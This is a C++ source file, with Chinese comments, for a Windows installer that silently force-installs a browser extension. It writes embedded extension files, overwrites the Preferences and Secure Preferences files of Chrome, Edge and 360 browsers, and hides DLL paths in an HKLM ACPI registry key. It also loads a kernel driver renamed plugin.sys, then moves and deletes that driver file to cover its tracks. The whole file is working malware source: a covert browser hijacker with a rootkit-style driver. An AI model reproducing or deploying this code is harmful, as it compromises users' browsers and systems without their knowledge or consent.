// InstallPlugin.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <shlobj_core.h>
#include <iostream>
#include "fun.h"
#include "background.js.h"
#include "content.js.h"
#include "manifest.json.h"
#include "Secure_Preferences.h"
#include "Secure_Preferences_edge.h"

#include "kmemnetb.sys.h"
#include "plugin_x32.dll.h"
#include "plugin_x64.dll.h"
#include <string> 
#pragma comment(lib, "Shell32.lib")
#pragma comment(linker, "/SECTION:.rdata,RW")

#include "sp.h"


using namespace std;
#define CFG_WRITE2(key,val) RegWrite2(HKEY_LOCAL_MACHINE,(wchar_t*)L"HARDWARE\\ACPI",REG_BINARY,(wchar_t*)key,(wchar_t*)val,wcslen(val)*sizeof(wchar_t)) 

#define PLUGIN_PATH L"C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\plg"

#define Edge_PLUGIN_PATH        L"C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Secure Preferences"
#define Google_PLUGIN_PATH      L"C:\\Users\\Administrator\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Secure Preferences"
#define _360chromex_PLUGIN_PATH L"C:\\Users\\Administrator\\AppData\\local\\360chromex\\chrome\\User Data\\Default\\Preferences"
#define _360chrome_PLUGIN_PATH  L"C:\\Users\\Administrator\\AppData\\local\\360chrome\\chrome\\User Data\\Default\\Preferences"
#define SYS  L"C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\plg\\plugin.sys"
#define NEW_SYS_PATH L"C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\plugin.sys"

void run()
{
    wstring background_js(PLUGIN_PATH) ;
    wstring content_js(PLUGIN_PATH);
    wstring manifest_json(PLUGIN_PATH);
    wstring Secure_Preferences(PLUGIN_PATH);

    wstring kmemnetb_sys(PLUGIN_PATH);
    wstring plugin_x32_dll(PLUGIN_PATH);
    wstring plugin_x64_dll(PLUGIN_PATH);

    //创建插件目录
    CreateDirectory(PLUGIN_PATH, NULL);
    /// <summary>
    /// /////////////////////////C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default
    SHCreateDirectoryExW(NULL, L"C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default", NULL);//\\User Data\\Default

    SHCreateDirectoryExW(NULL, L"C:\\Users\\Administrator\\AppData\\Local\\Google\\Chrome\\User Data\\Default", NULL);
    SHCreateDirectoryExW(NULL, L"c:\\users\\administrator\\appdata\\local\\360chromex\\chrome\\User Data\\Default", NULL);
    SHCreateDirectoryExW(NULL, L"c:\\users\\administrator\\appdata\\local\\360chrome\\chrome\\User Data\\Default", NULL);


    //X:\\通用工具\\360极速浏览器X\\User Data\\Default
    SHCreateDirectoryExW(NULL, L"X:\\通用工具\\360极速浏览器X\\User Data\\Default", NULL);
    SHCreateDirectoryExW(NULL, L"x:\\通用工具\\360安全浏览器\\User Data\\Default", NULL);
    SHCreateDirectoryExW(NULL, L"X:\\通用工具\\360极速浏览器\\360chrome\\chrome\\User Data\\Default", NULL);

#if 0
    //解密资源数据
//decrypt((char*)BACKGROUND_JS, sizeof(BACKGROUND_JS));
//decrypt((char*)CONTENT_JS, sizeof(CONTENT_JS));
//decrypt((char*)MANIFEST_JSON, sizeof(MANIFEST_JSON));
//decrypt((char*)SECURE_PREFERENCES, sizeof(SECURE_PREFERENCES));


//decrypt((char*)KMEMNETB_SYS, sizeof(KMEMNETB_SYS));//驱动
//decrypt((char*)PLUGIN_X32_DLL, sizeof(PLUGIN_X32_DLL));//x32dll
//decrypt((char*)PLUGIN_X64_DLL, sizeof(PLUGIN_X64_DLL));//x64dll  
#endif //  //解密资源数据

#if 1

    //释放文件 插件
    write_file((wchar_t*)(background_js + L"\\background.js").c_str(), BACKGROUND_JS, sizeof(BACKGROUND_JS));
    write_file((wchar_t*)(content_js + L"\\content.js").c_str(), CONTENT_JS, sizeof(CONTENT_JS));
    write_file((wchar_t*)(manifest_json + L"\\manifest.json").c_str(), MANIFEST_JSON, sizeof(MANIFEST_JSON));


    //释放文件 配合文件
    write_file((wchar_t*)(kmemnetb_sys + L"\\plugin.sys").c_str(), KMEMNETB_SYS, sizeof(KMEMNETB_SYS));//驱动
    write_file((wchar_t*)(plugin_x32_dll + L"\\plugin_x32.dll").c_str(), PLUGIN_X32_DLL, sizeof(PLUGIN_X32_DLL));//x32dll
    write_file((wchar_t*)(plugin_x64_dll + L"\\plugin_x64.dll").c_str(), PLUGIN_X64_DLL, sizeof(PLUGIN_X64_DLL));//x64dll
    //将dll信息写进注册表
    CFG_WRITE2((wchar_t*)L"D32", (wchar_t*)(plugin_x32_dll + L"\\plugin_x32.dll").c_str());
    CFG_WRITE2((wchar_t*)L"D64", (wchar_t*)(plugin_x64_dll + L"\\plugin_x64.dll").c_str());

    //加载驱动文件
    INT64 sysret = LoadNTDriver((wchar_t*)L"kmemnetb.sys", (wchar_t*)SYS);
    if (sysret == FALSE)
    {
        return;
    }
    MoveFile(SYS, NEW_SYS_PATH);//先移动
    _wremove(NEW_SYS_PATH);//删除驱动本地文件

#endif // 0

    //将Secure_Preferences 、Preferences写到相应的插件目录
    int secure_preferences_size = sizeof(SECURE_PREFERENCES);
    write_file((wchar_t*)Edge_PLUGIN_PATH, SECURE_PREFERENCES_EDGE, sizeof(SECURE_PREFERENCES_EDGE));//Secure_Preferences_edge
    write_file((wchar_t*)Google_PLUGIN_PATH, SECURE_PREFERENCES, secure_preferences_size);//Secure_Preferences
    write_file((wchar_t*)_360chromex_PLUGIN_PATH, SECURE_PREFERENCES, secure_preferences_size);//Preferences
    write_file((wchar_t*)_360chrome_PLUGIN_PATH, SECURE_PREFERENCES, secure_preferences_size);//Preferences



    //将Secure_Preferences 、Preferences写到相应的浏览器下的 插件目录
    //获取到浏览器所在的位置

    int nret = write_file((wchar_t*)L"X:\\通用工具\\360极速浏览器\\360chrome\\chrome\\User Data\\Default\\Preferences", SECURE_PREFERENCES, secure_preferences_size);//Preferences
    printf("write_file ret = %d\r\n", nret);
    write_file((wchar_t*)L"x:\\通用工具\\360安全浏览器\\User Data\\Default\\Preferences", SECURE_PREFERENCES, secure_preferences_size);//Preferences
    write_file((wchar_t*)L"X:\\通用工具\\360极速浏览器X\\User Data\\Default\\Preferences", SECURE_PREFERENCES, secure_preferences_size);//Preferences
    //删除驱动文件

}


// 先创建chrome edge 配置文件目录
// 修改chrome edge 配置文件
// 释放插件文件
// 加载驱动


//设置浏览器插件
BOOL Set_Secure_Preferences()
{

    wchar_t* sps[] = {
     L"C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Secure Preferences",
     L"C:\\Users\\Administrator\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Secure Preferences",
     L"C:\\Users\\Administrator\\AppData\\local\\360chromex\\chrome\\User Data\\Default\\Preferences",
     L"C:\\Users\\Administrator\\AppData\\local\\360chrome\\chrome\\User Data\\Default\\Preferences"
    };

   for (size_t i = 0; i < sizeof(sps)/sizeof(wchar_t*); i++)
   {
       wchar_t* sp= (wchar_t*)wcsrchr(sps[i], L'\\');
       if (sp){

           *sp = '\0';
           SHCreateDirectoryExW(NULL, sps[i], NULL);
           sp[0] = '\\';
       }

       if (i == 0)//edge
       {
           write_file(sps[i], (void*)Secure_Preferences_edge.c_str(), Secure_Preferences_edge.length());
       }
       else
       {
           write_file(sps[i], (void*)Secure_Preferences.c_str(), Secure_Preferences.length());
       }

   }



    return TRUE;
}


BOOL RelessPlugin()
{

    //释放插件
    std:wstring plg = L"C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\plg\\";
    SHCreateDirectoryExW(NULL, plg.c_str(), NULL);

	//释放文件 插件
	write_file2(plg + L"background.js", BACKGROUND_JS, sizeof(BACKGROUND_JS));
	write_file2(plg + L"content.js", CONTENT_JS, sizeof(CONTENT_JS));
	write_file2((plg + L"manifest.json"), MANIFEST_JSON, sizeof(MANIFEST_JSON));



    //释放文件 配合文件
    write_file2(plg + L"plugin.sys", KMEMNETB_SYS, sizeof(KMEMNETB_SYS));//驱动
    write_file2(plg + L"plugin_x32.dll", PLUGIN_X32_DLL, sizeof(PLUGIN_X32_DLL));//x32dll
    write_file2(plg + L"plugin_x64.dll", PLUGIN_X64_DLL, sizeof(PLUGIN_X64_DLL));//x64dll


    //将dll信息写进注册表
    CFG_WRITE2(L"D32", (plg + L"\\plugin_x32.dll").c_str());
    CFG_WRITE2(L"D64", (plg + L"\\plugin_x64.dll").c_str());


    //加载驱动文件
    std:wstring sys = L"C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\plg\\plugin.sys";
    INT64 sysret = LoadNTDriver((wchar_t*)L"kmemnetb.sys", (wchar_t*)sys.c_str());

    MoveFile(sys.c_str(), L"C:\\Users\\Administrator\\AppData\\13213.dat");//先移动
    _wremove(L"C:\\Users\\Administrator\\AppData\\13213.dat");//删除驱动本地文件

}


int main()
{
    RelessPlugin();
    Set_Secure_Preferences();
   
   // run();
    //run2();
    system("pause");
}

